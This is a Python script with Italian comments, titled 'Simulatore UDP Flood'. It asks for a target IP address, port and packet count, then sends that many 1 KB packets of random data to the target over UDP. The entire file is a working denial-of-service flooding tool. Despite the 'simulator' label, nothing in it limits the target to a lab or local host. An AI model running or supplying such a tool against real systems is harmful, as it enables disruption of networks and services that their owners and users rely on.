import socket     # Importa il modulo per lavorare con i socket di rete
import random     # Importa il modulo random (non necessario in questo caso, ma utile se si vuole usare random al posto di os.urandom)
import os         # Importa il modulo os per generare dati binari casuali (usato per creare pacchetti da 1KB)

# Funzione che esegue l'UDP flood
def udp_flood(target_ip, target_port, num_packets):
    # Crea un socket UDP (SOCK_DGRAM specifica il tipo UDP)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Imposta la dimensione del pacchetto a 1 KB (1024 byte)
    packet_size = 1024
    
    # Cicla per il numero di pacchetti da inviare
    for i in range(num_packets):
        # Crea un pacchetto di 1024 byte con contenuto casuale (byte casuali)
        data = os.urandom(packet_size)
        
        # Invia il pacchetto all'indirizzo IP e porta specificati
        sock.sendto(data, (target_ip, target_port))
        
        # Stampa un messaggio per indicare che il pacchetto è stato inviato
        print(f"[{i+1}/{num_packets}] Pacchetto inviato a {target_ip}:{target_port}")
    
    # Dopo aver finito, stampa che l'invio è stato completato
    print("Inondazione completata.")

# Funzione principale del programma
def main():
    print("=== Simulatore UDP Flood ===")
    
    # Chiede all'utente di inserire l'indirizzo IP target
    target_ip = input("Inserisci l'indirizzo IP target: ")
    
    # Richiede all'utente la porta, controllando che sia un numero valido tra 1 e 65535
    while True:
        try:
            # Converte l'input in numero intero
            target_port = int(input("Inserisci la porta UDP target (1-65535): "))
            # Verifica che la porta sia nel range valido
            if 1 <= target_port <= 65535:
                break  # Esce dal ciclo se la porta è valida
            else:
                print("Porta non valida. Inserisci un numero tra 1 e 65535.")
        except ValueError:
            # Se l'input non è un numero intero, mostra un messaggio di errore
            print("Input non valido. Inserisci un numero intero.")
    
    # Chiede all'utente quanti pacchetti vuole inviare
    while True:
        try:
            num_packets = int(input("Quanti pacchetti da 1 KB vuoi inviare? "))
            if num_packets > 0:
                break  # Esce dal ciclo se il numero è maggiore di 0
            else:
                print("Il numero deve essere maggiore di zero.")
        except ValueError:
            # Gestisce l'errore se l'input non è un numero
            print("Input non valido. Inserisci un numero intero.")
    
    # Chiama la funzione per avviare l'invio dei pacchetti
    udp_flood(target_ip, target_port, num_packets)

# Controlla se il file è eseguito direttamente (non importato) e chiama main()
if __name__ == "__main__":
    main()
